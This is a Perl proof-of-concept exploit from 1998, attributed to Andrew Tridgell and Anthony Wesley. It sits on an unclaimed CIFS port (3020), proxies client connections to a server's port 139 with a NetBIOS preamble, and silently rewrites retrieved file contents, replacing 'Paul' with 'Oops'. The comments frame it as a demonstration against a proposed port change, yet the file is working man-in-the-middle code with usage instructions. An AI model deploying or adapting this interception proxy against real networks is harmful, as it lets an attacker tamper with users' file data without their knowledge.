#!/usr/bin/perl
# This is an exploit for servers that provide file services
# to new CIFS clients that talk to port 3020 by default, rather
# than the usual port 139. It is an unusual exploit because it
# was written before the security hole was even implemented.
# It is named in honour of Paul Leach, the Microsoft CIFS
# specification writer who proposed the port number change.
# Enjoy!
#
# What it does: paul.pl is a simple CIFS proxy. It redirects 
# connections on port 3020 to port 139, adding appropriate
# netbios preamble. All file services will appear to work as usual
# except that the occurance of the word "Paul" in any documents
# retrieved will be replaced with the word "Oops".
#
# To use this exploit find a server (NT or unix, doesn't matter) that
# doesn't have a new CIFS server installed. Then run this program. 
# the next time a new style client connects they will find their file data
# changed just a litte bit :-)
#
# NT is vulnerable to this exploit no matter what port number is chosen
# for the new CIFS. Unix systems are only vulnerable if the port number
# is above 1024. 3020 has been proposed.
#
# Written by Andrew Tridgell and Anthony Wesley in January 1998
# in the hope that it will never be used.
#
use IO::Socket;
use IO::Select;

# replace this with the IP address of your server. 
# (why doesn't 127.0.0.1 work?)
my $target = "192.168.2.13";

my $port1 = "3020";
my $port2 = "139";
my $Msg;

# this is a *SMBSERVER netbios session request
$nbt_init = "\x81\0\0H CKFDENECFDEFFCFGEFFCCACACACACACA\0 EGEKEBEMEMCACACACACACACACACACAAA\0<<<<";

# Create a local socket
$sock1 = new IO::Socket::INET(LocalHost=>'localhost',LocalPort=>$port1,Proto=>'tcp',
			      Listen=>5,Reuse=>1);

print "waiting\n";

# Accept a connection
$IS = $sock1->accept() || die;

# Open a socket to the remote host
$OS = new IO::Socket::INET(PeerAddr=>$target,PeerPort=>$port2,Proto=>'tcp') || die;

print "connected\n";

# Create a read set for select()
$rs = new IO::Select();
$rs->add($IS,$OS);

$first = 1;

while(1) {
    ($r_ready) = IO::Select->select($rs,undef,undef,undef);
    
    foreach $i (@$r_ready) {
	$o = $OS if $i == $IS;
	$o = $IS if $i == $OS;
	
	recv($i,$Msg,8192,0);
	exit if ! length $Msg;
	
	if ($first && $i == $IS && substr($Msg,0,1) eq "\0") {
	    print "sending netbios preamble\n";
	    send($OS,$nbt_init,0);
	    recv($OS,$dummy,8192,0);
	}
	
	$first = 0;
	
	if ($i == $OS) { $Msg =~ s/Paul/Oops/mg;}
	send($o,$Msg,0);
    }
}

exit 0;
